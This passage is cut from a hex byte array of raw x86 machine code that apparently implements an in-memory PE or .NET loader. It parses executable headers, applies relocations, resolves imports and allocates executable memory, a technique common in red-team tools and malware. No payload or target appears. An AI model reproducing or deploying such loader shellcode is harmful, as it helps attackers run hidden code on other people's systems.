0x00, 0x00, 0x50, 0x8d, 0x87, 0x3c, 0x02, \n  0x00, 0x00, 0x50, 0x8d, 0x47, 0x14, 0x50, 0x8d, 0x47, 0x04, 0x50, 0xe8, \n  0x37, 0x16, 0x00, 0x00, 0xff, 0x73, 0x04, 0x8d, 0x87, 0x2c, 0x0c, 0x00, \n  0x00, 0xff, 0x33, 0x50, 0xe8, 0xfc, 0x14, 0x00, 0x00, 0x83, 0xc4, 0x1c, \n  0x3b, 0x87, 0x30, 0x0d, 0x00, 0x00, 0x0f, 0x85, 0x5b, 0x02, 0x00, 0x00, \n  0x3b, 0x97, 0x34, 0x0d, 0x00, 0x00, 0x0f, 0x85, 0x4f, 0x02, 0x00, 0x00, \n  0xff, 0x73, 0x04, 0xff, 0x33, 0xff, 0x77, 0x34, 0xff, 0x77, 0x30, 0x57, \n  0xe8, 0x8d, 0x14, 0x00, 0x00, 0x83, 0xc4, 0x14, 0x89, 0x47, 0x30, 0x85, \n  0xc0, 0x0f, 0x84, 0x66, 0xff, 0xff, 0xff, 0x8d, 0xb7, 0x40, 0x02, 0x00, \n  0x00, 0x8a, 0x0e, 0x33, 0xc0, 0x84, 0xc9, 0x74, 0x3a, 0x8d, 0x6c, 0x24, \n  0x44, 0x8b, 0xd6, 0x2b, 0xee, 0x80, 0xf9, 0x3b, 0x74, 0x12, 0x3d, 0x04, \n  0x01, 0x00, 0x00, 0x73, 0x0b, 0x88, 0x0c, 0x2a, 0x40, 0x42, 0x8a, 0x0a, \n  0x84, 0xc9, 0x75, 0xe9, 0x85, 0xc0, 0x74, 0x17, 0x46, 0xc6, 0x44, 0x04, \n  0x44, 0x00, 0x03, 0xf0, 0x8d, 0x44, 0x24, 0x44, 0x50, 0x57, 0xe8, 0x42, \n  0x12, 0x00, 0x00, 0x59, 0x59, 0xeb, 0xbe, 0x33, 0xed, 0x45, 0x39, 0xaf, \n  0x3c, 0x02, 0x00, 0x00, 0x76, 0x57, 0x8d, 0x47, 0x34, 0x8d, 0x77, 0x38, \n  0x89, 0x44, 0x24, 0x18, 0xff, 0x73, 0x04, 0xff, 0x33, 0xff, 0x76, 0x04, \n  0xff, 0x36, 0x57, 0xe8, 0x12, 0x14, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x2c, \n  0x83, 0xc4, 0x14, 0x89, 0x01, 0x85, 0xc0, 0x75, 0x1d, 0x8b, 0x06, 0x3b, \n  0x87, 0xa0, 0x01, 0x00, 0x00, 0x0f, 0x85, 0xa4, 0x01, 0x00, 0x00, 0x8b, \n  0x46, 0x04, 0x3b, 0x87, 0xa4, 0x01, 0x00, 0x00, 0x0f, 0x85, 0x95, 0x01, \n  0x00, 0x00, 0x45, 0x83, 0xc1, 0x04, 0x83, 0xc6, 0x08, 0x89, 0x4c, 0x24, \n  0x18, 0x3b, 0xaf, 0x3c, 0x02, 0x00, 0x00, 0x72, 0xb3, 0x8b, 0x87, 0x20, \n  0x09, 0x00, 0x00, 0x6a, 0x02, 0x5d, 0x3b, 0xc5, 0x75, 0x17, 0x57, 0xe8, \n  0x0f, 0xf1, 0xff, 0xff, 0x59, 0x85, 0xc0, 0x0f, 0x84, 0x66, 0x01, 0x00, \n  0x00, 0x8b, 0xb7, 0x60, 0x0d, 0x00, 0x00, 0xeb, 0x18, 0x83, 0xf8, 0x03, \n  0x0f, 0x84, 0x55, 0x01, 0x00, 0x00, 0x8d, 0xb7, 0x60, 0x0d, 0x00, 0x00, \n  0x83, 0xf8, 0x01, 0x74, 0x04, 0x8b, 0x74, 0x24, 0x1c, 0x83, 0xbf, 0x70, \n  0x05, 0x00, 0x00, 0x01, 0x74, 0x2e, 0x57, 0xe8, 0x73, 0xef, 0xff, 0xff, \n  0x59, 0x85, 0xc0, 0x75, 0x0c, 0x39, 0xaf, 0x70, 0x05, 0x00, 0x00, 0x0f, \n  0x84, 0x26, 0x01, 0x00, 0x00, 0x57, 0xe8, 0x57, 0xf0, 0xff, 0xff, 0x59, \n  0x85, 0xc0, 0x75, 0x0c, 0x39, 0xaf, 0x70, 0x05, 0x00, 0x00, 0x0f, 0x84, \n  0x0f, 0x01, 0x00, 0x00, 0x83, 0x7e, 0x08, 0x01, 0x0f, 0x84, 0x9c, 0x00, \n  0x00, 0x00, 0x8b, 0x86, 0x24, 0x05, 0x00, 0x00, 0x6a, 0x04, 0x05, 0x2f, \n  0x15, 0x00, 0x00, 0x68, 0x00, 0x30, 0x00, 0x00, 0x25, 0x00, 0xf0, 0xff, \n  0xff, 0x50, 0x6a, 0x00, 0xff, 0x54, 0x24, 0x2c, 0x8b, 0xd8, 0x85, 0xdb, \n  0x0f, 0x84, 0xdd, 0x00, 0x00, 0x00, 0x68, 0x30, 0x05, 0x00, 0x00, 0x56, \n  0x53, 0xe8, 0x99, 0x17, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x83, 0x7e, 0x08, \n  0x03, 0x74, 0x22, 0x83, 0x7e, 0x08, 0x04, 0x74, 0x1c, 0x39, 0x6e, 0x08, \n  0x75, 0x54, 0x8d, 0x83, 0x28, 0x05, 0x00, 0x00, 0x50, 0x8d, 0x86, 0x28, \n  0x05, 0x00, 0x00, 0x50, 0xe8, 0x75, 0x15, 0x00, 0x00, 0x59, 0x59, 0xeb, \n  0x3b, 0x8d, 0x44, 0x24, 0x20, 0xb9, 0x00, 0x01, 0x00, 0x00, 0x50, 0xff, \n  0xb6, 0x20, 0x05, 0x00, 0x00, 0x8d, 0x86, 0x28, 0x05, 0x00, 0x00, 0x50, \n  0xff, 0xb6, 0x24, 0x05, 0x00, 0x00, 0x8d, 0x83, 0x28, 0x05, 0x00, 0x00, \n  0x50, 0x66, 0x8b, 0x46, 0x08, 0x66, 0x48, 0x66, 0x0b, 0xc1, 0x0f, 0xb7, \n  0xc0, 0x50, 0xff, 0x97, 0x18, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x6b, \n  0x8b, 0xf3, 0x83, 0x3e, 0x03, 0x74, 0x50, 0x83, 0x3e, 0x04, 0x74, 0x4b, \n  0x83, 0x3e, 0x01, 0x74, 0x17, 0x39, 0x2e, 0x74, 0x13, 0x83, 0x3e, 0x05, \n  0x74, 0x05, 0x83, 0x3e, 0x06, 0x75, 0x41, 0x56, 0x57, 0xe8, 0x8f, 0x0c, \n  0x00, 0x00, 0xeb, 0x36, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x56, 0x57, 0xe8, \n  0xd4, 0xfa, 0xff, 0xff, 0x83, 0xc4, 0x0c, 0x85, 0xc0, 0x74, 0x0f, 0x8d, \n  0x44, 0x24, 0x24, 0x50, 0x56, 0x57, 0xe8, 0xa0, 0x00, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x57, 0xe8, 0x7f, 0xf5, 0xff, \n  0xff, 0xeb, 0x07, 0x56, 0x57, 0xe8, 0xe9, 0x03, 0x00, 0x00, 0x59, 0x59, \n  0x83, 0xbf, 0x30, 0x02, 0x00, 0x00, 0x03, 0x75, 0x02, 0xeb, 0xfe, 0x8b, \n  0x6c, 0x24, 0x10, 0x8b, 0x87, 0x20, 0x09, 0x00, 0x00, 0x83, 0xf8, 0x02, \n  0x74, 0x05, 0x83, 0xf8, 0x03, 0x75, 0x37, 0x8b, 0x87, 0x60, 0x0d, 0x00, \n  0x00, 0x85, 0xc0, 0x74, 0x2d, 0xff, 0xb7, 0x58, 0x0d, 0x00, 0x00, 0x6a, \n  0x00, 0x50, 0xe8, 0xc0, 0x16, 0x00, 0x00, 0x8b, 0x5c, 0x24, 0x20, 0x83, \n  0xc4, 0x0c, 0x68, 0x00, 0xc0, 0x00, 0x00, 0x6a, 0x00, 0xff, 0xb7, 0x60, \n  0x0d, 0x00, 0x00, 0xff, 0xd3, 0x83, 0xa7, 0x60, 0x0d, 0x00, 0x00, 0x00, \n  0xeb, 0x04, 0x8b, 0x5c, 0x24, 0x14, 0xff, 0x37, 0x8b, 0xb7, 0x30, 0x02, \n  0x00, 0x00, 0x6a, 0x00, 0x57, 0xe8, 0x8d, 0x16, 0x00, 0x00, 0x83, 0xc4, \n  0x0c, 0x68, 0x00, 0xc0, 0x00, 0x00, 0x6a, 0x00, 0x57, 0xff, 0xd3, 0x83, \n  0xfe, 0x02, 0x75, 0x04, 0x6a, 0x00, 0xff, 0xd5, 0x33, 0xc0, 0xe9, 0xc1, \n  0xfc, 0xff, 0xff, 0x81, 0xec, 0x7c, 0x02, 0x00, 0x00, 0x53, 0x8b, 0x9c, \n  0x24, 0x84, 0x02, 0x00, 0x00, 0x33, 0xc0, 0x55, 0x56, 0x8b, 0xb4, 0x24, \n  0x90, 0x02, 0x00, 0x00, 0x33, 0xed, 0x21, 0x6c, 0x24, 0x18, 0x57, 0x8d, \n  0x7c, 0x24, 0x48, 0xab, 0xab, 0xab, 0xab, 0x33, 0xc0, 0x83, 0x3e, 0x02, \n  0x66, 0x89, 0x44, 0x24, 0x18, 0x0f, 0x85, 0x97, 0x01, 0x00, 0x00, 0x8b, \n  0x84, 0x24, 0x98, 0x02, 0x00, 0x00, 0x8b, 0x48, 0x14, 0x8d, 0x78, 0x1c, \n  0x57, 0x51, 0x8b, 0x01, 0xff, 0x50, 0x40, 0x85, 0xc0, 0x0f, 0x88, 0x74, \n  0x01, 0x00, 0x00, 0x8b, 0x07, 0x8d, 0x54, 0x24, 0x1c, 0x52, 0x50, 0x8b, \n  0x08, 0xff, 0x51, 0x48, 0x85, 0xc0, 0x0f, 0x88, 0xe9, 0x02, 0x00, 0x00, \n  0x8d, 0x44, 0x24, 0x2c, 0x50, 0x6a, 0x01, 0xff, 0x74, 0x24, 0x24, 0xff, \n  0x93, 0xa8, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x28, 0x50, 0x6a, 0x01, \n  0xff, 0x74, 0x24, 0x24, 0xff, 0x93, 0xac, 0x00, 0x00, 0x00, 0x8b, 0x44, \n  0x24, 0x28, 0x2b, 0x44, 0x24, 0x2c, 0x83, 0xc0, 0x01, 0x0f, 0x84, 0xe3, \n  0x00, 0x00, 0x00, 0x6a, 0x01, 0x55, 0x6a, 0x0c, 0xff, 0x93, 0x9c, 0x00, \n  0x00, 0x00, 0x81, 0xc6, 0x0c, 0x04, 0x00, 0x00, 0x8b, 0xe8, 0x80, 0x3e, \n  0x00, 0x74, 0x7b, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x56, \n  0x53, 0xe8, 0xf6, 0x0e, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, 0x24, \n  0x14, 0x50, 0x8d, 0x84, 0x24, 0x8c, 0x00, 0x00, 0x00, 0x50, 0xff, 0x93, \n  0x94, 0x00, 0x00, 0x00, 0xff, 0x74, 0x24, 0x14, 0x8b, 0xf0, 0xb8, 0x08, \n  0x20, 0x00, 0x00, 0x6a, 0x00, 0x6a, 0x08, 0x66, 0x89, 0x44, 0x24, 0x44, \n  0xff, 0x93, 0x9c, 0x00, 0x00, 0x00, 0x83, 0x64, 0x24, 0x10, 0x00, 0x83, \n  0x7c, 0x24, 0x14, 0x00, 0x89, 0x44, 0x24, 0x40, 0x76, 0x66, 0x33, 0xc0, \n  0xff, 0x34, 0x86, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, 0x50, 0x8d, 0x44, \n  0x24, 0x14, 0x50, 0xff, 0x74, 0x24, 0x48, 0xff, 0x93, 0xa0, 0x00, 0x00, \n  0x00, 0x8b, 0x44, 0x24, 0x10, 0x40, 0x89, 0x44, 0x24, 0x10, 0x3b, 0x44, \n  0x24, 0x14, 0x72, 0xd8, 0xeb, 0x3a, 0x6a, 0x01, 0x6a, 0x00, 0xb8, 0x08, \n  0x20, 0x00, 0x00, 0x6a, 0x08, 0x66, 0x89, 0x44, 0x24, 0x44, 0xff, 0x93, \n  0x9c, 0x00, 0x00, 0x00, 0x83, 0x64, 0x24, 0x10, 0x00, 0x89, 0x44, 0x24, \n  0x40, 0x8d, 0x44, 0x24, 0x18, 0x50, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, \n  0x50, 0x8d, 0x44, 0x24, 0x14, 0x50, 0xff, 0x74, 0x24, 0x48, 0xff, 0x93, \n  0xa0, 0x00, 0x00, 0x00, 0x83, 0x64, 0x24, 0x10, 0x00, 0x8d, 0x44, 0x24, \n  0x38, 0x50, 0x8d, 0x44, 0x24, 0x14, 0x50, 0x55, 0xff, 0x93, 0xa0, 0x00, \n  0x00, 0x00, 0x83, 0x64, 0x24, 0x50, 0x00, 0x8d, 0x54, 0x24, 0x68, 0x52, \n  0x33, 0xc0, 0x8d, 0x74, 0x24, 0x4c, 0x40, 0x66, 0x89, 0x44, 0x24, 0x4c, \n  0x8b, 0x07, 0x55, 0x83, 0xec, 0x10, 0x8b, 0xfc, 0x8b, 0x08, 0x50, 0xa5, \n  0xa5, 0xa5, 0xa5, 0xff, 0x91, 0x94, 0x00, 0x00, 0x00, 0x85, 0xed, 0x0f, \n  0x84, 0xa0, 0x01, 0x00, 0x00, 0xff, 0x74, 0x24, 0x40, 0xff, 0x93, 0xa4, \n  0x00, 0x00, 0x00, 0x55, 0xff, 0x93, 0xa4, 0x00, 0x00, 0x00, 0xe9, 0x8a, \n  0x01, 0x00, 0x00, 0x21, 0x2f, 0xe9, 0x83, 0x01, 0x00, 0x00, 0x8d, 0x84, \n  0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x8d, 0x86, 0x0c, 0x02, 0x00, 0x00, \n  0x50, 0x53, 0xe8, 0xd5, 0x0d, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x84, \n  0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, \n  0x8b, 0xe8, 0x89, 0x6c, 0x24, 0x20, 0x85, 0xed, 0x0f, 0x84, 0x52, 0x01, \n  0x00, 0x00, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x8d, 0x86, \n  0x0c, 0x03, 0x00, 0x00, 0x50, 0x53, 0xe8, 0xa1, 0x0d, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0xff, 0x93, \n  0xb0, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x24, 0x85, 0xc0, 0x0f, 0x84, \n  0x16, 0x01, 0x00, 0x00, 0x8b, 0x8c, 0x24, 0x98, 0x02, 0x00, 0x00, 0x8b, \n  0x51, 0x14, 0x8d, 0x79, 0x18, 0x57, 0x55, 0x52, 0x8b, 0x0a, 0x89, 0x7c, \n  0x24, 0x40, 0xff, 0x51, 0x44, 0x85, 0xc0, 0x0f, 0x88, 0xea, 0x00, 0x00, \n  0x00, 0x81, 0xc6, 0x0c, 0x04, 0x00, 0x00, 0x33, 0xed, 0x80, 0x3e, 0x00, \n  0x0f, 0x84, 0x9a, 0x00, 0x00, 0x00, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, \n  0x00, 0x50, 0x56, 0x53, 0xe8, 0x43, 0x0d, 0x00, 0x00, 0x83, 0xc4, 0x0c, \n  0x8d, 0x44, 0x24, 0x14, 0x50, 0x8d, 0x84, 0x24, 0x8c, 0x00, 0x00, 0x00, \n  0x50, 0xff, 0x93, 0x94, 0x00, 0x00, 0x00, 0xff, 0x74, 0x24, 0x14, 0x89, \n  0x44, 0x24, 0x34, 0x55, 0x6a, 0x0c, 0xff, 0x93, 0x9c, 0x00, 0x00, 0x00, \n  0x8b, 0xe8, 0x85, 0xed, 0x74, 0x5e, 0x83, 0x64, 0x24, 0x10, 0x00, 0x83, \n  0x7c, 0x24, 0x14, 0x00, 0x76, 0x52, 0x8b, 0x7c, 0x24, 0x30, 0x33, 0xc0, \n  0xff, 0x34, 0x87, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, 0x6a, 0x08, 0x89, \n  0x44, 0x24, 0x64, 0x58, 0x66, 0x89, 0x44, 0x24, 0x58, 0x8d, 0x44, 0x24, \n  0x58, 0x50, 0x8d, 0x44, 0x24, 0x14, 0x50, 0x55, 0xff, 0x93, 0xa0, 0x00, \n  0x00, 0x00, 0x8b, 0xf0, 0x85, 0xf6, 0x79, 0x09, 0x55, 0xff, 0x93, 0xa4, \n  0x00, 0x00, 0x00, 0x33, 0xed, 0x8b, 0x44, 0x24, 0x10, 0x40, 0x89, 0x44, \n  0x24, 0x10, 0x3b, 0x44, 0x24, 0x14, 0x72, 0xbc, 0x8b, 0x7c, 0x24, 0x34, \n  0x85, 0xf6, 0x78, 0x3b, 0x8b, 0x07, 0x8d, 0x54, 0x24, 0x78, 0x52, 0x55, \n  0x83, 0xec, 0x10, 0x8d, 0x74, 0x24, 0x60, 0x8b, 0x08, 0x8b, 0xfc, 0x6a, \n  0x00, 0xa5, 0x68, 0x18, 0x01, 0x00, 0x00, 0xa5, 0xa5, 0xa5, 0x8b, 0x74, \n  0x24, 0x44, 0x56, 0x50, 0xff, 0x91, 0xe4, 0x00, 0x00, 0x00, 0x85, 0xed, \n  0x74, 0x07, 0x55, 0xff, 0x93, 0xa4, 0x00, 0x00, 0x00, 0x8b, 0x6c, 0x24, \n  0x20, 0xeb, 0x08, 0x8b, 0x6c, 0x24, 0x20, 0x8b, 0x74, 0x24, 0x24, 0x56, \n  0xff, 0x93, 0xb4, 0x00, 0x00, 0x00, 0x55, 0xff, 0x93, 0xb4, 0x00, 0x00, \n  0x00, 0x33, 0xc0, 0x40, 0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x7c, 0x02, \n  0x00, 0x00, 0xc3, 0x81, 0xec, 0x40, 0x03, 0x00, 0x00, 0x8b, 0x84, 0x24, \n  0x48, 0x03, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, 0x48, 0x03, 0x00, 0x00, \n  0x05, 0x28, 0x05, 0x00, 0x00, 0x55, 0x56, 0x33, 0xf6, 0x89, 0x44, 0x24, \n  0x30, 0x8b, 0x68, 0x3c, 0x03, 0xe8, 0x89, 0x74, 0x24, 0x14, 0x56, 0x89, \n  0x74, 0x24, 0x10, 0x89, 0x74, 0x24, 0x28, 0x89, 0x6c, 0x24, 0x2c, 0xff, \n  0x53, 0x38, 0x8b, 0xd0, 0x66, 0x8b, 0x45, 0x04, 0x8b, 0x4a, 0x3c, 0x66, \n  0x3b, 0x44, 0x11, 0x04, 0x0f, 0x85, 0x15, 0x08, 0x00, 0x00, 0x8b, 0x45, \n  0x50, 0x89, 0x44, 0x24, 0x48, 0x89, 0x74, 0x24, 0x4c, 0x8b, 0x85, 0xa4, \n  0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0x85, 0xc0, 0x75, 0x07, 0x8b, \n  0x45, 0x34, 0x89, 0x44, 0x24, 0x0c, 0x57, 0x6a, 0x03, 0x33, 0xc9, 0x8d, \n  0xbb, 0x25, 0x06, 0x00, 0x00, 0x5a, 0x41, 0x80, 0x3f, 0x00, 0x56, 0x75, \n  0x27, 0x68, 0x00, 0x00, 0x00, 0x08, 0x6a, 0x40, 0x8d, 0x44, 0x24, 0x58, \n  0x50, 0x56, 0x68, 0x1f, 0x00, 0x0f, 0x00, 0x8d, 0x44, 0x24, 0x5c, 0x50, \n  0xff, 0x93, 0x20, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xbc, 0x07, \n  0x00, 0x00, 0xeb, 0x7a, 0x56, 0x52, 0x56, 0x51, 0x68, 0x00, 0x00, 0x00, \n  0x80, 0x57, 0xff, 0x53, 0x60, 0x8b, 0xf8, 0x83, 0xff, 0xff, 0x0f, 0x84, \n  0xa2, 0x07, 0x00, 0x00, 0x85, 0xff, 0x0f, 0x84, 0x9a, 0x07, 0x00, 0x00, \n  0x8d, 0x44, 0x24, 0x3c, 0x0f, 0x57, 0xc0, 0x50, 0x57, 0x66, 0x0f, 0x13, \n  0x44, 0x24, 0x44, 0xff, 0x53, 0x64, 0x85, 0xc0, 0x0f, 0x84, 0x80, 0x07, \n  0x00, 0x00, 0x8b, 0x45, 0x50, 0x3b, 0x44, 0x24, 0x3c, 0x0f, 0x87, 0x73, \n  0x07, 0x00, 0x00, 0x57, 0x68, 0x00, 0x00, 0x00, 0x01, 0x6a, 0x02, 0x58, \n  0x50, 0x56, 0x56, 0x68, 0x1f, 0x00, 0x0f, 0x00, 0x8d, 0x44, 0x24, 0x5c, \n  0x50, 0xff, 0x93, 0x20, 0x01, 0x00, 0x00, 0x57, 0x8b, 0xf0, 0xff, 0x93, \n  0x90, 0x00, 0x00, 0x00, 0x85, 0xf6, 0x0f, 0x85, 0x46, 0x07, 0x00, 0x00, \n  0x8d, 0xbb, 0x25, 0x06, 0x00, 0x00, 0x6a, 0x04, 0x58, 0x50, 0x56, 0x6a, \n  0x02, 0x58, 0x50, 0x8d, 0x44, 0x24, 0x34, 0x50, 0x56, 0x56, 0x56, 0x8d, \n  0x44, 0x24, 0x2c, 0x50, 0xff, 0x53, 0x70, 0x50, 0xff, 0x74, 0x24, 0x68, \n  0xff, 0x93, 0x24, 0x01, 0x00, 0x00, 0x8b, 0x74, 0x24, 0x34, 0x8b, 0x4c, \n  0x24, 0x10, 0x8b, 0x76, 0x3c, 0x03, 0xf1, 0x89, 0x74, 0x24, 0x1c, 0x85, \n  0xc0, 0x74, 0x0b, 0x3d, 0x03, 0x00, 0x00, 0x40, 0x0f, 0x85, 0xfc, 0x06, \n  0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0xf4, 0x06, 0x00, 0x00, 0x80, 0x3f, \n  0x00, 0x74, 0x4a, 0x8d, 0x44, 0x24, 0x30, 0x50, 0x6a, 0x04, 0x5f, 0x57, \n  0xff, 0x74, 0x24, 0x30, 0x51, 0xff, 0x53, 0x48, 0x57, 0x68, 0x00, 0x30, \n  0x00, 0x00, 0xff, 0x75, 0x54, 0x6a, 0x00, 0xff, 0x53, 0x3c, 0xff, 0x75, \n  0x54, 0x8b, 0xf8, 0xff, 0x74, 0x24, 0x14, 0x89, 0x7c, 0x24, 0x50, 0x57, \n  0xe8, 0x46, 0x11, 0x00, 0x00, 0xff, 0x74, 0x24, 0x34, 0x6a, 0x00, 0xff, \n  0x74, 0x24, 0x24, 0xe8, 0x5b, 0x11, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x28, \n  0x83, 0xc4, 0x18, 0xeb, 0x08, 0x8b, 0x44, 0x24, 0x3c, 0x89, 0x44, 0x24, \n  0x48, 0xff, 0x75, 0x54, 0xff, 0x74, 0x24, 0x38, 0x51, 0xe8, 0x19, 0x11, \n  0x00, 0x00, 0x8b, 0x44, 0x24, 0x1c, 0x33, 0xc9, 0x83, 0x64, 0x24, 0x20, \n  0x00, 0x83, 0xc4, 0x0c, 0x89, 0x46, 0x34, 0x0f, 0xb7, 0x46, 0x14, 0x83, \n  0xc0, 0x18, 0x03, 0xc6, 0x89, 0x44, 0x24, 0x3c, 0x66, 0x3b, 0x4e, 0x06, \n  0x73, 0x44, 0x8b, 0x5c, 0x24, 0x14, 0x8d, 0x78, 0x10, 0x8b, 0xee, 0xff, \n  0x37, 0x8b, 0x47, 0x04, 0x8b, 0x77, 0xfc, 0x03, 0x44, 0x24, 0x38, 0x03, \n  0x74, 0x24, 0x14, 0x50, 0x56, 0xe8, 0xd5, 0x10, 0x00, 0x00, 0x0f, 0xb6, \n  0x06, 0x8d, 0x7f, 0x28, 0x83, 0xc4, 0x0c, 0x89, 0x47, 0xd0, 0x0f, 0xb7, \n  0x45, 0x06, 0x43, 0x3b, 0xd8, 0x72, 0xd4, 0x8b, 0x9c, 0x24, 0x54, 0x03, \n  0x00, 0x00, 0x8b, 0x6c, 0x24, 0x2c, 0x8b, 0x74, 0x24, 0x1c, 0x8b, 0x54, \n  0x24, 0x10, 0x8b, 0xfa, 0x2b, 0x7d, 0x34, 0x83, 0x7c, 0x24, 0x24, 0x00, \n  0x0f, 0x84, 0xc2, 0x00, 0x00, 0x00, 0x85, 0xff, 0x0f, 0x84, 0xba, 0x00, \n  0x00, 0x00, 0x8b, 0x86, 0xa0, 0x00, 0x00, 0x00, 0x8d, 0x0c, 0x10, 0x03, \n  0x44, 0x24, 0x24, 0x89, 0x44, 0x24, 0x38, 0x03, 0xc2, 0x89, 0x4c, 0x24, \n  0x20, 0x3b, 0xc8, 0x0f, 0x83, 0x9b, 0x00, 0x00, 0x00, 0x8b, 0x41, 0x04, \n  0x85, 0xc0, 0x0f, 0x84, 0x90, 0x00, 0x00, 0x00, 0x8d, 0x71, 0x08, 0xeb, \n  0x6d, 0x0f, 0xb7, 0x36, 0x8b, 0x44, 0x24, 0x20, 0x8b, 0xce, 0x81, 0xe1, \n  0xff, 0x0f, 0x00, 0x00, 0x03, 0x08, 0x8b, 0x44, 0x24, 0x1c, 0x3b, 0x48, \n  0x50, 0x73, 0x43, 0x66, 0xc1, 0xee, 0x0c, 0x66, 0x83, 0xfe, 0x0a, 0x74, \n  0x08, 0x6a, 0x03, 0x58, 0x66, 0x3b, 0xf0, 0x75, 0x05, 0x01, 0x3c, 0x11, \n  0xeb, 0x1d, 0x33, 0xc0, 0x40, 0x66, 0x3b, 0xf0, 0x75, 0x07, 0x8b, 0xc7, \n  0xc1, 0xe8, 0x10, 0xeb, 0x0b, 0x6a, 0x02, 0x58, 0x66, 0x3b, 0xf0, 0x75, \n  0x0c, 0x0f, 0xb7, 0xc7, 0x01, 0x04, 0x11, 0x8b, 0x54, 0x24, 0x10, 0xeb, \n  0x09, 0x66, 0x85, 0xf6, 0x0f, 0x85, 0x1f, 0x05, 0x00, 0x00, 0x8b, 0x74, \n  0x24, 0x14, 0x6a, 0x02, 0x59, 0x03, 0xf1, 0x8b, 0x4c, 0x24, 0x20, 0x8b, \n  0x41, 0x04, 0x03, 0xc1, 0x89, 0x74, 0x24, 0x14, 0x3b, 0xf0, 0x75, 0x89, \n  0x8b, 0x44, 0x24, 0x38, 0x8b, 0xce, 0x03, 0xc2, 0x89, 0x74, 0x24, 0x20, \n  0x3b, 0xf0, 0x0f, 0x82, 0x65, 0xff, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x1c, \n  0x8b, 0x80, 0x80, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xc4, 0x00, \n  0x00, 0x00, 0x8d, 0x34, 0x10, 0x83, 0x7e, 0x0c, 0x00, 0x89, 0x74, 0x24, \n  0x18, 0x0f, 0x84, 0xb3, 0x00, 0x00, 0x00, 0x8b, 0x46, 0x0c, 0x03, 0xc2, \n  0x50, 0x53, 0xe8, 0x3e, 0x09, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x18, 0x8b, \n  0x7e, 0x10, 0x89, 0x44, 0x24, 0x40, 0x03, 0xfa, 0x8b, 0x06, 0x03, 0xc2, \n  0x89, 0x7c, 0x24, 0x28, 0x59, 0x59, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x08, \n  0x85, 0xc9, 0x74, 0x71, 0x8b, 0x6c, 0x24, 0x38, 0x8b, 0xb4, 0x24, 0x58, \n  0x03, 0x00, 0x00, 0x79, 0x0c, 0x51, 0x6a, 0x00, 0x55, 0x53, 0xe8, 0xa4, \n  0x09, 0x00, 0x00, 0xeb, 0x32, 0x8d, 0x7a, 0x02, 0x03, 0xf9, 0x83, 0x7e, \n  0x04, 0x00, 0x74, 0x19, 0x57, 0x53, 0xe8, 0x93, 0xf2, 0xff, 0xff, 0x59, \n  0x59, 0x85, 0xc0, 0x74, 0x0c, 0x8b, 0x83, 0x08, 0x01, 0x00, 0x00, 0x8b, \n  0x7c, 0x24, 0x20, 0xeb, 0x11, 0x6a, 0x00, 0x57, 0x55, 0x53, 0xe8, 0x74, \n  0x09, 0x00, 0x00, 0x8b, 0x7c, 0x24, 0x30, 0x83, 0xc4, 0x10, 0x89, 0x07, \n  0x8b, 0x44, 0x24, 0x14, 0x8b, 0x54, 0x24, 0x10, 0x6a, 0x04, 0x59, 0x03, \n  0xc1, 0x03, 0xf9, 0x89, 0x44, 0x24, 0x14, 0x89, 0x7c, 0x24, 0x20, 0x8b, \n  0x08, 0x85, 0xc9, 0x75, 0x9e, 0x8b, 0x74, 0x24, 0x18, 0x83, 0xc6, 0x14, \n  0x89, 0x74, 0x24, 0x18, 0x83, 0x7e, 0x0c, 0x00, 0x0f, 0x85, 0x51, 0xff, \n  0xff, 0xff, 0x8b, 0x6c, 0x24, 0x2c, 0x8b, 0x44, 0x24, 0x1c, 0x8b, 0x80, \n  0xe0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x8c, 0x00, 0x00, 0x00, \n  0x8d, 0x70, 0x04, 0x03, 0xf2, 0x89, 0x74, 0x24, 0x18, 0x8b, 0x06, 0x85, \n  0xc0, 0x74, 0x7d, 0x03, 0xc2, 0x50, 0x53, 0xe8, 0x6d, 0x08, 0x00, 0x00, \n  0x8b, 0x54, 0x24, 0x18, 0x89, 0x44, 0x24, 0x40, 0x59, 0x59, 0x85, 0xc0, \n  0x74, 0x55, 0x8b, 0x7e, 0x0c, 0x8b, 0x4e, 0x08, 0x03, 0xfa, 0x03, 0xca, \n  0x89, 0x4c, 0x24, 0x14, 0x8b, 0x07, 0x85, 0xc0, 0x74, 0x41, 0x8b, 0x6c, \n  0x24, 0x38, 0x6a, 0x04, 0x5e, 0x79, 0x04, 0x33, 0xc9, 0xeb, 0x05, 0x8d, \n  0x4a, 0x02, 0x03, 0xc8, 0x33, 0xd2, 0x85, 0xc0, 0x0f, 0x49, 0xc2, 0x50, \n  0x51, 0x55, 0x53, 0xe8, 0xc7, 0x08, 0x00, 0x00, 